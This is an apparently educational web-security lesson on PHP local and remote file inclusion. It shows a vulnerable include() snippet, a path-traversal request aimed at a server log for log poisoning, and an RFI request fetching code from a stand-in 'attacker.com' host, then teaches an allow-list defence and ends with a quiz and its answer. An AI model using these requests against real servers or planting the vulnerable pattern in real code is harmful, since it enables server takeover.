# Local & Remote File Inclusion (LFI/RFI)

The path-traversal lesson covered reading files outside an intended directory. This lesson covers a related but more dangerous variant, common specifically in dynamically-typed, file-including languages like PHP: getting the server to actually *execute* a file, not just read it.

## What file inclusion actually is

Some server-side languages support dynamically including and *executing* another file's code based on a variable:

```php
<?php
$page = $_GET['page'];
include($page . ".php");
?>
```

This pattern — genuinely common in older PHP applications for building modular page templates — becomes exploitable the moment the `page` parameter isn't strictly validated against an allow-list.

## LFI: Local File Inclusion

**LFI** exploits this pattern using the path-traversal technique from earlier in this path, but with a critical difference from plain path traversal: instead of just *reading* a file's raw content, the included file's code actually *executes*:

```
GET /index.php?page=../../../../var/log/apache2/access.log
```

If an attacker can get attacker-controlled content into a file the server will subsequently include (even indirectly — log poisoning, planting PHP code inside a User-Agent header that later gets logged, then including that log file), the "included" content executes as genuine server-side PHP code, turning a file-read primitive into full code execution.

## RFI: Remote File Inclusion

**RFI** is the more directly dangerous variant, where the include mechanism accepts a full URL rather than just a local path:

```
GET /index.php?page=http://attacker.com/malicious.txt
```

If the server fetches and executes this remote file directly, the attacker has achieved immediate, complete remote code execution with no local file-planting step required at all — genuinely one of the most severe outcomes possible from a single vulnerable parameter, though RFI is less common today since most modern PHP configurations disable remote file inclusion by default.

## Why this connects directly to command injection

Recall the cmd-and-upload lesson's framing: file inclusion is "two paths to server takeover," and file inclusion is genuinely one of them — the end result (arbitrary code execution on the server) is functionally identical to a successful command injection, even though the specific mechanism getting there is completely different.

## The defense: allow-lists, not blocklists

```php
<?php
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed_pages)) {
    include($page . ".php");
}
?>
```

Exactly mirroring the path-traversal lesson's core lesson: validating against a specific, known-good allow-list of legitimate values closes this vulnerability structurally, rather than trying to filter out every possible malicious path or URL pattern after the fact.

:::challenge Test yourself
Why is RFI generally considered more severe than LFI, even though both stem from the same underlying vulnerable code pattern?
<details><summary>Show answer</summary>LFI requires the attacker to first find a way to get their malicious code planted somewhere <em>on the server's own filesystem</em> before they can include and execute it — through a file upload, log poisoning, or another separate vulnerability — meaning LFI alone is often just one step in a longer exploitation chain. RFI, by contrast, lets the attacker directly specify a URL pointing to <em>their own, externally-hosted</em> malicious file, achieving code execution in a single request with no separate file-planting step required at all — the attacker doesn't need to find any other way onto the server first, they simply point the vulnerable include statement directly at content they already fully control. This is exactly why RFI represents a more immediately severe, single-step path to complete server compromise, even though modern server configurations increasingly disable the specific setting that makes RFI possible by default.</details>
:::

## Key terms

- **LFI (Local File Inclusion)** — exploiting a dynamic include statement to execute a local file's content as server-side code.
- **RFI (Remote File Inclusion)** — exploiting a dynamic include statement to execute code from an attacker-controlled remote URL.
- **Log poisoning** — planting malicious code inside a log file (via a header or input that gets logged) so it can later be triggered through LFI.

## Recap

- File inclusion vulnerabilities turn a dynamic include statement into arbitrary code execution, a meaningfully more severe outcome than plain path traversal's file-read alone.
- LFI typically requires a separate step to plant malicious content on the server first; RFI allows direct execution of attacker-hosted remote code in a single request.
- Allow-listing legitimate values, exactly mirroring the path-traversal lesson's defense, closes this vulnerability class structurally.

**Next up →** [Deserialization Attacks](#/lesson/11-web-security/deserialization-attacks)
